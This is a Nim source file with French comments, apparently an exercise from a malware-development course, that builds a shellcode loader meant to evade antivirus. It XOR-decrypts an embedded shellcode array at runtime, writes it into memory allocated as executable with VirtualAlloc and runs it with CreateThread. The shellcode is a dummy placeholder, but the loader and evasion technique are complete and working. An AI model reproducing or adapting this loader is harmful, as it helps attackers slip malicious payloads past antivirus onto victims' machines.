
import winim
import strformat
import xor_utils  # Notre module XOR

# ==============================================
# EXERCICE 3 : LOADER AVEC ÉVASION ANTIVIRUS
# Version 1 : Obfuscation XOR du shellcode
# ==============================================

# --- Configuration ---
const TARGET_PROCESS = "explorer.exe"

# --- Clé XOR (à générer aléatoirement en production) ---
const XOR_KEY: array[4, byte] = [byte 0xAA, 0xBB, 0xCC, 0xDD]

# --- Shellcode CHIFFRÉ (sera déchiffré à l'exécution) ---
# Ce shellcode est le résultat de XOR(shellcode_original, XOR_KEY)
var encryptedShellcode: array[8, byte] = [
  byte 0x56, 0xF3, 0x4F, 0x48,  # Shellcode factice XORé
  0x5A, 0x43, 0x0C, 0xDD
]

echo "[*] Shellcode chiffré : ", encryptedShellcode.toHexString()

# --- Fonction de déchiffrement à l'exécution ---
proc decryptShellcode[I, T](encrypted: var array[I, T], key: openArray[byte]): void =
  echo "[*] Déchiffrement du shellcode..."
  
  # XOR est réversible : XOR(XOR(data, key), key) = data
  xorCrypt(encrypted, key)
  
  echo "[+] Shellcode déchiffré : ", encrypted.toHexString()

# --- Injection locale (copié de l'exercice 1) ---
proc injectLocal[I, T](shellcode: var array[I, T]): bool =
  echo fmt"[*] Allocation de {shellcode.len} bytes"
  
  # 1. Allouer mémoire RWX
  let executable_memory = VirtualAlloc(
    nil,
    len(shellcode),
    MEM_COMMIT,
    PAGE_EXECUTE_READWRITE
  )
  
  if executable_memory == nil:
    echo "[-] Erreur VirtualAlloc"
    return false
  
  echo fmt"[+] Mémoire allouée à 0x{cast[int](executable_memory):X}"
  
  # 2. Copier le shellcode
  copyMem(executable_memory, shellcode[0].addr, len(shellcode))
  echo "[+] Shellcode copié"
  
  # 3. Créer un thread
  let tHandle = CreateThread(
    nil, 
    0,
    cast[LPTHREAD_START_ROUTINE](executable_memory),
    nil,
    0, 
    cast[LPDWORD](0)
  )
  
  if tHandle == 0:
    echo "[-] Erreur CreateThread"
    return false
  
  defer: CloseHandle(tHandle)
  echo "[+] Thread créé"
  
  # 4. Attendre la fin
  echo "[*] Attente fin exécution..."
  discard WaitForSingleObject(tHandle, INFINITE)
  
  return true

# --- Point d'entrée ---
when isMainModule:
  echo "==================================="
  echo "  LOADER v1 - ÉVASION XOR"
  echo "==================================="
  
  # 1. Déchiffrer le shellcode
  decryptShellcode(encryptedShellcode, XOR_KEY)
  
  # 2. Injecter
  let success = injectLocal(encryptedShellcode)
  
  if success:
    echo "[+] Injection réussie !"
  else:
    echo "[-] Injection échouée"